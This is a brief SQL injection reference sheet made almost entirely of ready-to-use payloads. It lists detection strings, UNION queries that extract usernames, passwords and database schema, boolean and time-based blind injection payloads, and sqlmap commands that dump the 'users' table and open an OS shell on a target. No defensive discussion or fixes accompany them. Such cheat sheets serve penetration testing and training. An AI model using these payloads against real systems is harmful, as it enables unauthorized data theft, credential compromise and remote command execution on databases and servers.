# SQL Injection Reference

## Detection
```bash
# Basic tests
' OR '1'='1
' OR '1'='1'--
" OR "1"="1
' OR 1=1--
' OR 'x'='x

# Error-based detection
'
''
`
``
,
"
""
```

## UNION-Based
```sql
-- Find column count
' ORDER BY 1--
' ORDER BY 2--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--

-- Extract data
' UNION SELECT 1,2,3--
' UNION SELECT username,password,3 FROM users--
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

## Blind SQLi
```sql
-- Boolean-based
' AND 1=1--  (true)
' AND 1=2--  (false)
' AND SUBSTRING(username,1,1)='a'--

-- Time-based
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '0:0:5'--
```

## SQLMap
```bash
# Basic
sqlmap -u "http://target/page?id=1" --dbs
sqlmap -u "http://target/page?id=1" -D dbname --tables
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump

# POST request
sqlmap -u "http://target/login" --data="user=admin&pass=test" -p user

# With cookie
sqlmap -u "http://target/page?id=1" --cookie="session=abc123"

# OS shell
sqlmap -u "http://target/page?id=1" --os-shell
```
